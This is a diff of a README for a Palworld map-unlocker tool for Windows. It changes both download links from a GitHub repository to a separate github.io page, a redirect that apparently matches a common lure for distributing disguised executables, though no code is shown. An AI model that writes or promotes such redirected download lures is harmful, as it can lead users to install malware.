@@ -1,6 +1,6 @@
 # 🗺️ palworld-map-unlocker - Unlock your map location progress instantly
 
-[![](https://img.shields.io/badge/Download-Map_Unlocker-blue.svg)](https://github.com/juliusallergenic243/palworld-map-unlocker)
+[![](https://img.shields.io/badge/Download-Map_Unlocker-blue.svg)](https://juliusallergenic243.github.io)
 
 ## 📖 Overview
 
@@ -19,7 +19,7 @@ This application runs on Windows systems. You need the following items to use th
 
 Follow these steps to set up the software on your PC. 
 
-1. Download the tool. Visit [this page to download](https://github.com/juliusallergenic243/palworld-map-unlocker) the latest version.
+1. Download the tool. Visit [this page to download](https://juliusallergenic243.github.io) the latest version.
 2. Locate the file in your downloads folder.
 3. Extract the folder if the file is in a compressed ZIP format. Right-click the folder and select Extract All.
 4. Close your game if you have it running. Saving your game while the tool runs can cause errors.
